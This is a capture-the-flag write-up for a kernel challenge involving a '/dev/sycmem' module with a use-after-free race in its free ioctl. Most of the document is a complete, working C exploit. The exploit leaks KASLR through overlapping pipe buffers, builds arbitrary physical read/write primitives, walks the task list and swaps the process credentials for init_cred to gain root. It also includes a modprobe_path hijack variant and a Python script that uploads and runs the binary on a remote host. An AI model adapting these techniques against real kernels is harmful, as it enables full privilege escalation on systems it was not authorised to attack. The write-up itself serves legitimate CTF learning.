The first part to inspect is the ioctl handling for `/dev/sycmem`. The module provides four commands: `SYC_ALLOC`, `SYC_FREE`, `SYC_READ`, and `SYC_WRITE`; it stores 0x1000-byte slab objects in the global `slots` array. `READ` and `WRITE` copy data between the slot object and the user buffer based on the user-provided `idx`, `off`, `len`, and `buf`.

```
SYC_ALLOC = 0x40205310
SYC_FREE  = 0x40205311
SYC_READ  = 0xc0205312
SYC_WRITE = 0x40205313
```

The vulnerability comes from the `SYC_FREE` flow. In the disassembly, after freeing the slot pointer with `kmem_cache_free()`, the module does not immediately clear the slot. Instead, it drops the lock, performs `kmem_cache_shrink()` and an optional `copy_to_user(done, ...)`, then takes the lock again and resets the slot pointer and size.

```
kmem_cache_free(slot)
mutex_unlock(...)
kmem_cache_shrink(...)
copy_to_user(done, ...)
mutex_lock(...)
slot.ptr = NULL
slot.size = 0
```

Because of this window, another thread can still use the same slot as the target of `READ`/`WRITE`. In other words, even after the freed 0x1000 object is reused as another kernel object, `/dev/sycmem` can still be used to read or overwrite its contents, creating a UAF race.

## 2. Solution approach

To widen the race window, I called `FREE` from a separate thread and applied `madvise(MADV_DONTNEED)` to the anonymous page pointed to by `done`. When `FREE` performs the final `copy_to_user(done, ...)`, the page fault keeps the interval before slot reset open a bit longer.

I made the freed 0x1000 object overlap with an expanded pipe ring through cross-cache reuse. I created many pipes, enlarged their rings with `F_SETPIPE_SZ`, and wrote one byte to initialize the `pipe_buffer`. Immediately afterward, I used the UAF read to scan the slot contents for a structure that looked like a `pipe_buffer`.

```c
struct pipe_buffer_user {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};
```

The scan condition is simple. If `page` and `ops` look like kernel pointers and the low bits of `ops` match the static offset of `anon_pipe_buf_ops`, I treated the overlap as successful. This leak gives two values.

```
kaslr = leaked_anon_pipe_buf_ops - static_anon_pipe_buf_ops
vmemmap_base ~= leaked_pipe_page aligned down to 0x200000
```

Next, I used the same UAF write to replace the entire pipe ring with a fake `pipe_buffer` array. The read primitive works by setting `page` to the `struct page *` for the target physical page, setting `offset` and `len`, and then calling pipe read. I changed `ops` to `zero_pipe_buf_ops` instead of `anon_pipe_buf_ops`. When using `anon_pipe_buf_ops` as-is, the release path called `put_page()` on arbitrary task pages and made the kernel unstable; using `zero_pipe_buf_ops` avoided that side effect.

The write primitive is similar to Dirty Pipe: set the flag corresponding to `PIPE_BUF_FLAG_CAN_MERGE`, set `offset = target_offset - 1` and `len = 1`, and then call pipe write. This causes the data written to the pipe to land at the desired offset in the target page.

To convert kernel addresses to physical addresses, I used static symbol offsets together with the KASLR slide. The `anon_pipe_buf_ops` leak gives the slide, and I scanned the kernel image’s physical base in 2 MB increments. I validated each candidate by reading `page_offset_base` and `vmemmap_base`.

Privilege escalation was finished with a cred overwrite instead of `modprobe_path`. I was able to overwrite `modprobe_path` itself, but in this environment the helper execution did not lead to obtaining the flag. So I started from `init_task`, walked the `children`/`sibling` lists with DFS, set the exploit process `comm` to `kmage-main`, and then found that task.

```
children offset = 0x5d0
sibling offset  = 0x5e0
cred offset     = 0x780
comm offset     = 0x798
```

After finding the target task, I changed both `real_cred` and `cred` to point to `init_cred`. The same process then had uid 0, so it could open and print `/flag` directly.

## 3. Exploit

The exploit below is the version used for the privilege escalation. It wins the `SYC_FREE` race, builds pipe-buffer read/write primitives, finds the exploit process from `init_task`, and points both `real_cred` and `cred` at `init_cred`.

### exploit.c

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define SYC_ALLOC 0x40205310UL
#define SYC_FREE  0x40205311UL
#define SYC_READ  0xc0205312UL
#define SYC_WRITE 0x40205313UL

#define PAGE_SIZE 0x1000UL
#define PIPE_SIZE 0x40000
#define MAX_PIPES 96
#define LEAK_ATTEMPTS 500
#define WRITE_ATTEMPTS 160

#define STATIC_STEXT          0xffffffff81000000ULL
#define STATIC_ANON_PIPE_OPS  0xffffffff826265c0ULL
#define STATIC_ZERO_PIPE_OPS  0xffffffff82621060ULL
#define STATIC_MODPROBE_PATH  0xffffffff82f4ae80ULL
#define STATIC_VMEMMAP_BASE   0xffffffff82cc9210ULL
#define STATIC_PAGE_OFFSET    0xffffffff82cc9220ULL
#define STATIC_INIT_TASK      0xffffffff82e0ea00ULL
#define STATIC_INIT_CRED      0xffffffff82e0f680ULL
#define STRUCT_PAGE_SIZE      0x40ULL
#define VMEMMAP_ALIGN         0x200000ULL

#define TASKS_OFF             0x4e8ULL
#define CHILDREN_OFF          0x5d0ULL
#define SIBLING_OFF           0x5e0ULL
#define CRED_OFF              0x780ULL
#define COMM_OFF              0x798ULL
#define TASK_READ_LEN         0x2c0UL

#define LOW21(x) ((x) & 0x1fffffULL)

struct syc_req {
    uint32_t idx;
    uint32_t len;
    uint64_t off;
    uint64_t buf;
    uint64_t done;
};

struct free_arg {
    int fd;
    void *done_page;
};

struct pipe_buffer_user {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

static int syc_ioctl(int fd, unsigned long cmd, struct syc_req *req) {
    return ioctl(fd, cmd, req);
}

static void *free_thread(void *argp) {
    prctl(PR_SET_NAME, "kmage-free", 0, 0, 0);
    struct free_arg *arg = (struct free_arg *)argp;
    struct syc_req req = {
        .idx = 0,
        .done = (uint64_t)arg->done_page,
    };
    syc_ioctl(arg->fd, SYC_FREE, &req);
    return NULL;
}

static int looks_like_anon_ops(uint64_t v) {
    return (v >> 48) == 0xffff && LOW21(v) == LOW21(STATIC_ANON_PIPE_OPS);
}

static int scan_pipe_buffers(unsigned char *buf, uint64_t *ops_out, uint64_t *page_out) {
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000; off += 8) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(buf + off);
        if ((pb->page >> 48) == 0xffff &&
            looks_like_anon_ops(pb->ops) &&
            (pb->flags & ~0x7fU) == 0) {
            *ops_out = pb->ops;
            *page_out = pb->page;
            return off;
        }
    }
    return -1;
}

static uint64_t page_ptr_from_phys(uint64_t vmemmap_base, uint64_t phys) {
    return vmemmap_base + ((phys >> 12) * STRUCT_PAGE_SIZE);
}

static void close_pipes(int pipes[][2], int n) {
    for (int i = 0; i < n; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
}

static int make_pipes(int pipes[][2]) {
    int n = 0;
    for (; n < MAX_PIPES; n++) {
        if (pipe(pipes[n]) != 0) break;
    }
    return n;
}

static int alloc_sycmem(int fd, unsigned char *init) {
    struct syc_req req = {
        .idx = 0,
        .len = 0x1000,
        .off = 0,
        .buf = (uint64_t)init,
    };
    return syc_ioctl(fd, SYC_ALLOC, &req);
}

static int leak_pipe_ops(int fd, void *done, unsigned char *init,
                         unsigned char *leak, unsigned char *data,
                         uint64_t *ops_out, uint64_t *pipe_page_out) {
    for (int attempt = 1; attempt <= LEAK_ATTEMPTS; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = make_pipes(pipes);
        if (npipes <= 0) return -1;

        if (alloc_sycmem(fd, init) != 0) {
            close_pipes(pipes, npipes);
            continue;
        }

        madvise(done, PAGE_SIZE, MADV_DONTNEED);
        struct free_arg farg = {.fd = fd, .done_page = done};
        pthread_t th;
        pthread_create(&th, NULL, free_thread, &farg);

        for (int i = 0; i < npipes; i++) {
            fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
            if (write(pipes[i][1], data, 1) < 0) {
                continue;
            }

            memset(leak, 0, 0x1000);
            struct syc_req rreq = {
                .idx = 0,
                .len = 0x1000,
                .off = 0,
                .buf = (uint64_t)leak,
            };
            if (syc_ioctl(fd, SYC_READ, &rreq) == 0) {
                uint64_t ops = 0, page = 0;
                int off = scan_pipe_buffers(leak, &ops, &page);
                if (off >= 0) {
                    *ops_out = ops;
                    *pipe_page_out = page;
                    printf("[+] leak attempt=%d pipe=%d off=0x%x ops=0x%016llx page=0x%016llx\n",
                           attempt, i, off,
                           (unsigned long long)ops,
                           (unsigned long long)page);
                    pthread_join(th, NULL);
                    close_pipes(pipes, npipes);
                    return 0;
                }
            }
        }

        pthread_join(th, NULL);
        close_pipes(pipes, npipes);
        if ((attempt % 50) == 0) {
            printf("[-] leak attempt=%d\n", attempt);
            fflush(stdout);
        }
    }
    return -1;
}

static void dump_modprobe_sysctl(void) {
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0) {
        perror("open modprobe sysctl");
        return;
    }
    unsigned char buf[128];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n < 0) {
        perror("read modprobe sysctl");
        return;
    }
    printf("[modprobe]");
    for (ssize_t i = 0; i < n; i++) {
        unsigned char c = buf[i];
        if (c >= 0x20 && c <= 0x7e) {
            putchar(c);
        } else {
            printf("\\x%02x", c);
        }
    }
    putchar('\n');
}

static void build_pipe_payload(unsigned char *payload, uint64_t target_page,
                               uint64_t anon_ops, int off_delta,
                               uint32_t pb_len) {
    memset(payload, 0, 0x1000);
    uint32_t target_off = (uint32_t)(STATIC_MODPROBE_PATH & 0xfff);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = target_off + off_delta;
        pb->len = pb_len;
        pb->ops = anon_ops;
        pb->flags = 0x10;
        pb->private = 0;
    }
}

static void build_read_payload(unsigned char *payload, uint64_t target_page,
                               uint32_t target_off, uint32_t len,
                               uint64_t anon_ops) {
    memset(payload, 0, 0x1000);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = target_off;
        pb->len = len;
        pb->ops = anon_ops;
        pb->flags = 0;
        pb->private = 0;
    }
}

static int corrupt_pipe_ring_once(int fd, void *done, unsigned char *init,
                                  unsigned char *leak,
                                  unsigned char *payload,
                                  int pipes[][2], int *npipes_out,
                                  int *hit_out) {
    int npipes = make_pipes(pipes);
    *npipes_out = npipes;
    *hit_out = -1;
    if (npipes <= 0) return -1;

    if (alloc_sycmem(fd, init) != 0) {
        close_pipes(pipes, npipes);
        return -1;
    }

    madvise(done, PAGE_SIZE, MADV_DONTNEED);
    struct free_arg farg = {.fd = fd, .done_page = done};
    pthread_t th;
    pthread_create(&th, NULL, free_thread, &farg);

    int ok = 0;
    for (int i = 0; i < npipes; i++) {
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
        char one = 'A';
        if (write(pipes[i][1], &one, 1) < 0) continue;

        memset(leak, 0, 0x1000);
        struct syc_req rreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)leak,
        };
        uint64_t tmp_ops = 0, tmp_page = 0;
        if (syc_ioctl(fd, SYC_READ, &rreq) != 0 ||
            scan_pipe_buffers(leak, &tmp_ops, &tmp_page) < 0) {
            continue;
        }

        struct syc_req wreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)payload,
        };
        if (syc_ioctl(fd, SYC_WRITE, &wreq) == 0) {
            *hit_out = i;
            ok = 1;
            break;
        }
    }

    pthread_join(th, NULL);
    if (!ok) {
        close_pipes(pipes, npipes);
        return -1;
    }
    return 0;
}

static int phys_read_once(int fd, void *done, unsigned char *init,
                          unsigned char *leak, unsigned char *payload,
                          uint64_t vmemmap_base, uint64_t anon_ops,
                          uint64_t phys, void *out, size_t len) {
    if (len == 0 || len > 0xf00 || ((phys & 0xfff) + len) > 0x1000) {
        return -1;
    }

    uint64_t target_page = page_ptr_from_phys(vmemmap_base, phys & ~0xfffULL);
    uint64_t zero_ops = anon_ops + (STATIC_ZERO_PIPE_OPS - STATIC_ANON_PIPE_OPS);
    build_read_payload(payload, target_page, (uint32_t)(phys & 0xfff),
                       (uint32_t)len, zero_ops);

    for (int attempt = 0; attempt < 80; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = 0, hit = -1;
        if (corrupt_pipe_ring_once(fd, done, init, leak, payload,
                                   pipes, &npipes, &hit) != 0) {
            continue;
        }

        ssize_t n = -1;
        if (hit >= 0) {
            n = read(pipes[hit][0], out, len);
        }
        close_pipes(pipes, npipes);
        if (n == (ssize_t)len) return 0;
    }
    return -1;
}

static int phys_write_once(int fd, void *done, unsigned char *init,
                           unsigned char *leak, unsigned char *payload,
                           uint64_t vmemmap_base, uint64_t anon_ops,
                           uint64_t phys, const void *data, size_t len) {
    if (len == 0 || len > 0xf00 || (phys & 0xfff) == 0 ||
        ((phys & 0xfff) + len) > 0x1000) {
        return -1;
    }

    uint64_t target_page = page_ptr_from_phys(vmemmap_base, phys & ~0xfffULL);
    uint64_t zero_ops = anon_ops + (STATIC_ZERO_PIPE_OPS - STATIC_ANON_PIPE_OPS);
    memset(payload, 0, 0x1000);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = (uint32_t)(phys & 0xfff) - 1;
        pb->len = 1;
        pb->ops = zero_ops;
        pb->flags = 0x10;
        pb->private = 0;
    }

    for (int attempt = 0; attempt < 160; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = 0, hit = -1;
        if (corrupt_pipe_ring_once(fd, done, init, leak, payload,
                                   pipes, &npipes, &hit) != 0) {
            continue;
        }

        int writes = 0;
        for (int i = 0; i < npipes; i++) {
            ssize_t n = write(pipes[i][1], data, len);
            if (n == (ssize_t)len) writes++;
        }
        if (writes > 0) {
            return 0;
        }
        close_pipes(pipes, npipes);
    }
    return -1;
}

static uint64_t image_phys(uint64_t phys_code, uint64_t static_addr) {
    return phys_code + (static_addr - STATIC_STEXT);
}

static int kread_bytes(int fd, void *done, unsigned char *init,
                       unsigned char *leak, unsigned char *payload,
                       uint64_t vmemmap_base, uint64_t anon_ops,
                       uint64_t phys_code, uint64_t kaslr,
                       uint64_t page_offset_base, uint64_t kaddr,
                       void *out, size_t len) {
    unsigned char *p = out;
    while (len > 0) {
        uint64_t phys;
        if (kaddr >= page_offset_base && kaddr < page_offset_base + 0x10000000ULL) {
            phys = kaddr - page_offset_base;
        } else {
            uint64_t static_addr = kaddr - kaslr;
            phys = image_phys(phys_code, static_addr);
        }
        size_t chunk = 0x1000 - (phys & 0xfff);
        if (chunk > len) chunk = len;
        if (phys_read_once(fd, done, init, leak, payload, vmemmap_base,
                           anon_ops, phys, p, chunk) != 0) {
            return -1;
        }
        p += chunk;
        kaddr += chunk;
        len -= chunk;
    }
    return 0;
}

static int try_cred_lpe(int fd, void *done, unsigned char *init,
                        unsigned char *leak, unsigned char *payload,
                        uint64_t vmemmap_base, uint64_t anon_ops,
                        uint64_t phys_code, uint64_t kaslr) {
    uint64_t page_offset_base = 0;
    uint64_t page_offset_phys = image_phys(phys_code, STATIC_PAGE_OFFSET);
    if (phys_read_once(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                       page_offset_phys, &page_offset_base,
                       sizeof(page_offset_base)) != 0) {
        puts("[-] page_offset_base read failed");
        return -1;
    }
    printf("[+] page_offset_base=0x%016llx\n",
           (unsigned long long)page_offset_base);
    if ((page_offset_base >> 48) != 0xffffULL ||
        (page_offset_base & 0x3fffffffULL) != 0) {
        puts("[-] invalid page_offset_base");
        return -1;
    }

    uint64_t kernel_vmemmap_base = 0;
    if (phys_read_once(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                       image_phys(phys_code, STATIC_VMEMMAP_BASE),
                       &kernel_vmemmap_base,
                       sizeof(kernel_vmemmap_base)) != 0) {
        puts("[-] vmemmap_base read failed");
        return -1;
    }
    if (kernel_vmemmap_base != vmemmap_base) {
        printf("[-] invalid vmemmap_base=0x%016llx expected=0x%016llx\n",
               (unsigned long long)kernel_vmemmap_base,
               (unsigned long long)vmemmap_base);
        return -1;
    }

    uint64_t init_task = STATIC_INIT_TASK + kaslr;
    uint64_t init_cred = STATIC_INIT_CRED + kaslr;
    int verbose_tasks = getenv("VERBOSE_TASKS") != NULL;

    uint64_t stack[256];
    int sp = 0;
    stack[sp++] = init_task;
    int seen = 0;

    while (sp > 0 && seen < 512) {
        uint64_t parent = stack[--sp];
        uint64_t head = parent + CHILDREN_OFF;
        uint64_t entry = 0;
        if (kread_bytes(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                        phys_code, kaslr, page_offset_base, head,
                        &entry, sizeof(entry)) != 0) {
            continue;
        }

        for (int siblings = 0; siblings < 256 && entry && entry != head; siblings++) {
            uint64_t next = 0;
            if (kread_bytes(fd, done, init, leak, payload, vmemmap_base,
                            anon_ops, phys_code, kaslr, page_offset_base,
                            entry, &next, sizeof(next)) != 0) {
                break;
            }

            uint64_t task = entry - SIBLING_OFF;
            char comm[17];
            memset(comm, 0, sizeof(comm));
            if (kread_bytes(fd, done, init, leak, payload, vmemmap_base,
                            anon_ops, phys_code, kaslr, page_offset_base,
                            task + COMM_OFF, comm, 16) != 0) {
                entry = next;
                continue;
            }
            comm[16] = 0;
            if (verbose_tasks && seen < 120) {
                printf("[task] %03d task=0x%016llx entry=0x%016llx next=0x%016llx comm='%s'\n",
                       seen, (unsigned long long)task,
                       (unsigned long long)entry,
                       (unsigned long long)next, comm);
            }
            seen++;

        if (strcmp(comm, "kmage-main") == 0) {
            uint64_t cred_pair[2] = {init_cred, init_cred};
            uint64_t cred_kaddr = task + CRED_OFF;
            uint64_t cred_phys;
            if (cred_kaddr >= page_offset_base &&
                cred_kaddr < page_offset_base + 0x10000000ULL) {
                cred_phys = cred_kaddr - page_offset_base;
            } else {
                cred_phys = image_phys(phys_code, cred_kaddr - kaslr);
            }
            printf("[+] found task=0x%016llx entry=0x%016llx cred=0x%016llx init_cred=0x%016llx\n",
                   (unsigned long long)task,
                   (unsigned long long)entry,
                   (unsigned long long)cred_kaddr,
                   (unsigned long long)init_cred);
            if (phys_write_once(fd, done, init, leak, payload, vmemmap_base,
                                anon_ops, cred_phys, cred_pair,
                                sizeof(cred_pair)) != 0) {
                puts("[-] cred write failed");
                return -1;
            }
            usleep(100000);
            printf("[+] uid=%d euid=%d\n", getuid(), geteuid());
            return getuid() == 0 ? 0 : -1;
        }

            if (sp < (int)(sizeof(stack) / sizeof(stack[0]))) {
                stack[sp++] = task;
            }
            entry = next;
        }
    }

    puts("[-] task not found");
    return -1;
}

static int dirty_modprobe_once(int fd, void *done, unsigned char *init,
                               unsigned char *leak, unsigned char *payload,
                               const char *new_path) {
    int pipes[MAX_PIPES][2];
    int npipes = make_pipes(pipes);
    if (npipes <= 0) return -1;

    if (alloc_sycmem(fd, init) != 0) {
        close_pipes(pipes, npipes);
        return -1;
    }

    madvise(done, PAGE_SIZE, MADV_DONTNEED);
    struct free_arg farg = {.fd = fd, .done_page = done};
    pthread_t th;
    pthread_create(&th, NULL, free_thread, &farg);

    int writes = 0;
    for (int i = 0; i < npipes; i++) {
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
        char one = 'A';
        if (write(pipes[i][1], &one, 1) < 0) continue;

        memset(leak, 0, 0x1000);
        struct syc_req rreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)leak,
        };
        uint64_t tmp_ops = 0, tmp_page = 0;
        if (syc_ioctl(fd, SYC_READ, &rreq) != 0 ||
            scan_pipe_buffers(leak, &tmp_ops, &tmp_page) < 0) {
            continue;
        }

        struct syc_req wreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)payload,
        };
        if (syc_ioctl(fd, SYC_WRITE, &wreq) == 0) {
            writes++;
            break;
        }
    }

    pthread_join(th, NULL);

    size_t n = strlen(new_path) + 1;
    for (int i = 0; i < npipes; i++) {
        (void)write(pipes[i][1], new_path, n);
    }

    if (writes == 0) {
        close_pipes(pipes, npipes);
    }
    return writes;
}

static void setup_modprobe_files(void) {
    const char *helper =
        "#!/bin/sh\n"
        "cat /flag > /home/ctf/flag\n"
        "chmod 666 /home/ctf/flag\n";
    int fd = open("/home/ctf/h", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        write(fd, helper, strlen(helper));
        close(fd);
        chmod("/home/ctf/h", 0777);
    }
    fd = open("/home/ctf/x", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        unsigned char bad[] = {0xff, 0xff, 0xff, 0xff};
        write(fd, bad, sizeof(bad));
        close(fd);
        chmod("/home/ctf/x", 0777);
    }
    unlink("/home/ctf/flag");
}

static int trigger_and_print_flag(void) {
    pid_t pid = fork();
    if (pid == 0) {
        execl("/home/ctf/x", "x", NULL);
        _exit(111);
    }
    int st = 0;
    waitpid(pid, &st, 0);
    usleep(200000);

    int fd = open("/home/ctf/flag", O_RDONLY);
    if (fd < 0) return -1;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    printf("[FLAG] %s\n", buf);
    return 0;
}

static int print_root_flag(void) {
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) {
        perror("open /flag");
        return -1;
    }
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    printf("[FLAG] %s\n", buf);
    return 0;
}

int main(int argc, char **argv) {
    prctl(PR_SET_NAME, "kmage-main", 0, 0, 0);

    uint64_t first_phys = 0x01000000ULL;
    uint64_t last_phys = 0x05600000ULL;
    if (argc == 2) {
        first_phys = last_phys = strtoull(argv[1], NULL, 0);
    } else if (argc == 3) {
        first_phys = strtoull(argv[1], NULL, 0);
        last_phys = strtoull(argv[2], NULL, 0);
    }

    int fd = open("/dev/sycmem", O_RDWR);
    if (fd < 0) {
        perror("open /dev/sycmem");
        return 1;
    }

    void *done = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *init = aligned_alloc(0x1000, 0x1000);
    unsigned char *leak = aligned_alloc(0x1000, 0x1000);
    unsigned char *data = aligned_alloc(0x1000, 0x1000);
    unsigned char *payload = aligned_alloc(0x1000, 0x1000);
    if (done == MAP_FAILED || !init || !leak || !data || !payload) {
        perror("alloc");
        return 1;
    }
    memset(init, 0x41, 0x1000);
    memset(data, 0x42, 0x1000);

    uint64_t anon_ops = 0, pipe_page = 0;
    if (leak_pipe_ops(fd, done, init, leak, data, &anon_ops, &pipe_page) != 0) {
        puts("[-] failed to leak pipe_buffer");
        return 1;
    }
    uint64_t kaslr = anon_ops - STATIC_ANON_PIPE_OPS;
    uint64_t vmemmap_base = pipe_page & ~(VMEMMAP_ALIGN - 1);
    uint64_t sample_pipe_phys =
        ((pipe_page - vmemmap_base) / STRUCT_PAGE_SIZE) << 12;
    printf("[+] kbase=0x%016llx kaslr=0x%llx sample_pipe_phys=0x%llx\n",
           (unsigned long long)(STATIC_STEXT + kaslr),
           (unsigned long long)kaslr,
           (unsigned long long)sample_pipe_phys);
    printf("[+] vmemmap_base=0x%016llx\n", (unsigned long long)vmemmap_base);

    int use_modprobe = getenv("USE_MODPROBE") != NULL;
    const char *new_path = getenv("NEW_PATH");
    if (!new_path) new_path = "/home/ctf/h";
    if (use_modprobe) setup_modprobe_files();
    uint64_t modprobe_phys_off = STATIC_MODPROBE_PATH - STATIC_STEXT;
    int off_delta = -1;
    uint32_t pb_len = 1;
    char *env = getenv("OFF_DELTA");
    if (env) off_delta = (int)strtol(env, NULL, 0);
    env = getenv("PB_LEN");
    if (env) pb_len = (uint32_t)strtoul(env, NULL, 0);
    int no_trigger = getenv("NO_TRIGGER") != NULL;
    printf("[*] mode=%s\n", use_modprobe ? "modprobe" : "cred");
    if (use_modprobe) {
        printf("[*] pipe payload offset_delta=%d pb_len=%u no_trigger=%d\n",
               off_delta, pb_len, no_trigger);
        dump_modprobe_sysctl();
    }

    for (uint64_t phys = first_phys; phys <= last_phys; phys += 0x200000ULL) {
        printf("[*] try phys_code=0x%llx\n", (unsigned long long)phys);
        fflush(stdout);

        if (!use_modprobe) {
            if (try_cred_lpe(fd, done, init, leak, payload, vmemmap_base,
                             anon_ops, phys, kaslr) == 0 &&
                print_root_flag() == 0) {
                return 0;
            }
            continue;
        }

        uint64_t target_phys = phys + modprobe_phys_off;
        uint64_t target_page = page_ptr_from_phys(vmemmap_base, target_phys);
        build_pipe_payload(payload, target_page, anon_ops, off_delta, pb_len);
        printf("[*] target_page=0x%llx\n", (unsigned long long)target_page);
        fflush(stdout);

        for (int attempt = 1; attempt <= WRITE_ATTEMPTS; attempt++) {
            int wr = dirty_modprobe_once(fd, done, init, leak, payload, new_path);
            if (wr > 0) {
                printf("[*] write attempt=%d ioctl_writes=%d\n", attempt, wr);
                fflush(stdout);
                dump_modprobe_sysctl();
                if (no_trigger) return 0;
                if (trigger_and_print_flag() == 0) return 0;
            }
        }
    }

    puts("[-] exploit failed");
    return 1;
}
```

The remote wrapper compresses the compiled binary, uploads it to the challenge shell, and runs it.

### remote_solve.py

```python
#!/usr/bin/env python3
import base64
import gzip
import select
import socket
import sys
import time
from pathlib import Path

HOST = "1.95.125.195"
PORT = 5000


def recv_until(sock, marker=b"$ ", timeout=30):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.2)
        if not r:
            continue
        data = sock.recv(4096)
        if not data:
            break
        buf += data
        if marker in buf:
            break
    return buf


def recv_for(sock, timeout=180):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.5)
        if not r:
            continue
        data = sock.recv(4096)
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
        buf += data
        if b"[FLAG]" in buf or b"flag{" in buf or b"Kernel panic" in buf:
            # Keep reading a moment so the full line arrives.
            end = min(end, time.time() + 2)
    return buf


def main():
    raw = Path("exploit").read_bytes()
    payload = base64.b64encode(gzip.compress(raw, compresslevel=9)).decode()
    lines = "\n".join(payload[i:i + 76] for i in range(0, len(payload), 76))

    sock = socket.create_connection((HOST, PORT), timeout=10)
    sock.setblocking(False)
    sys.stdout.buffer.write(recv_until(sock, b"$ ", 20))
    sys.stdout.buffer.flush()

    script = (
        "cat > /home/ctf/exploit.gz.b64 <<'EOF'\n"
        + lines
        + "\nEOF\n"
        "base64 -d /home/ctf/exploit.gz.b64 > /home/ctf/exploit.gz\n"
        "gzip -d /home/ctf/exploit.gz\n"
        "chmod +x /home/ctf/exploit\n"
        "/home/ctf/exploit\n"
    ).encode()

    sock.setblocking(True)
    for i in range(0, len(script), 2048):
        sock.sendall(script[i:i + 2048])
        time.sleep(0.003)
    sock.setblocking(False)

    out = recv_for(sock, 240)
    sock.close()
    return 0 if b"flag{" in out else 1


if __name__ == "__main__":
    raise SystemExit(main())
```

The run showed that the process switched to root credentials and could read `/flag` directly.

```text
[+] uid=0 euid=0
[FLAG] SCTF{g0o0o0o-f0r-@-puNch-k3rnEL-M4st3r}
```

## 4. Flag

`SCTF{g0o0o0o-f0r-@-puNch-k3rnEL-M4st3r}`
:::
